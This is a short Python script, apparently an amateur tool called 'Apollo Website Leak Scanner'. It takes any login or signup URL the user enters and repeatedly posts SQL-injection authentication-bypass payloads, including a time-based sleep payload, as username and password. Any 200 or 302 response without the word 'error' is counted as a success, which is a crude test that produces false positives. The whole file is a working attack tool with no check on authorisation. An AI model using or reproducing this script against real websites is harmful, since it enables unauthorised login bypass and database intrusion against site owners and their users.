#OH GOD WHY PLEASE STOP
import requests
import time
import re
from urllib.parse import urlparse

def scan_site(url, attempts, delay):
    headers = {
        "User-Agent": "ApolloScanner/1.0",
    }

    payloads = [
        "' OR '1'='1", "' OR 1=1--", "' OR '1'='1' --", "' OR '1'='1' /*",
        "' OR ''='", "' OR 1=1#", "' OR 1=1/*", "' OR 'x'='x", "' or sleep(5)--"
    ]

    successful = []

    for i in range(attempts):
        for payload in payloads:
            try:
                data = {
                    "username": payload,
                    "password": payload
                }

                response = requests.post(url, data=data, headers=headers, timeout=5)
                if response.status_code in (200, 302) and "error" not in response.text.lower():
                    successful.append((payload, response.status_code))
            except Exception as e:
                continue
            time.sleep(delay)
    
    return successful

def summarize(successful):
    print("\n[+] SQL Injection Attempts That Succeeded:")
    for i, (payload, code) in enumerate(successful, 1):
        print(f"{i}. Payload: {payload} → HTTP {code}")
    if not successful:
        print("[!] No SQL injection attempts succeeded.")

def main():
    print("=== Apollo Website Leak Scanner ===")
    target_url = input("Enter the full signup/login page URL: ").strip()
    tries = input("Number of attempts: ").strip()
    interval = input("Interval between iterations (seconds): ").strip()

    try:
        tries = int(tries)
        interval = float(interval)
    except ValueError:
        print("[!] Invalid input. Try using numeric values.")
        return

    print("[*] Starting vulnerability scan...")
    results = scan_site(target_url, tries, interval)
    summarize(results)

if __name__ == "__main__":
    main()
